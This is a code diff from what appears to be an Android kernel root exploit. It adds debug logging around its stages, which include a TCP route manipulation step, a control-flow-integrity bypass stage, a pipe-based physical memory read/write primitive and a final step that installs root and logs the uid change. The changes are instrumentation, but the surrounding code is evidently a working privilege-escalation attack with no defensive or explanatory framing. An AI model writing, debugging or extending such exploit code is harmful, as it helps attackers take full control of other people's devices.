@@ -591,7 +591,13 @@ void do_tcp_fake_lock_route(void) {
         continue;
       }
 
-      if (run_cfi_stage_on_worker()) {
+      pr_info("main tcp cfi worker begin page=%d/%d seq=%d ret=%d errno=%d\n",
+              page_attempt, page_attempts, i, ret, saved_errno);
+      int cfi_ok = run_cfi_stage_on_worker();
+      pr_info("main tcp cfi worker end page=%d/%d seq=%d ok=%d step=%d errno=%d\n",
+              page_attempt, page_attempts, i, cfi_ok, cfi_last_step,
+              cfi_last_errno);
+      if (cfi_ok) {
         pr_info("main tcp route page=%d/%d seq=%d ret=%d errno=%d len=%u "
                 "calls=%d success=%d\n",
                 page_attempt, page_attempts, i, ret, saved_errno, len,
@@ -751,7 +757,20 @@ int restore_slide_boot_id(int fd) {
 }
 
 int install_child_root(int fd) {
-  return install_pipe_physrw(fd) && install_android_root(fd);
+  pr_info("child root pipe begin fd=%d page=%016zx\n", fd, page_base);
+  int pipe_ok = install_pipe_physrw(fd);
+  pr_info("child root pipe end ok=%d page=%016zx probe=%d idx=%d read=%d/%d write=%d/%d\n",
+          pipe_ok, page_base, pipe_probe_found, pipebuf_pipe_idx,
+          physrw_read_ok, physrw_read64_ok, physrw_write_ok,
+          physrw_write64_ok);
+  if (!pipe_ok) {
+    return 0;
+  }
+  pr_info("child root android begin fd=%d\n", fd);
+  int root_ok = install_android_root(fd);
+  pr_info("child root android end ok=%d uid=%u->%u\n",
+          root_ok, root_uid_before, root_uid_after);
+  return root_ok;
 }
 
 int try_cfi_stage(void) {
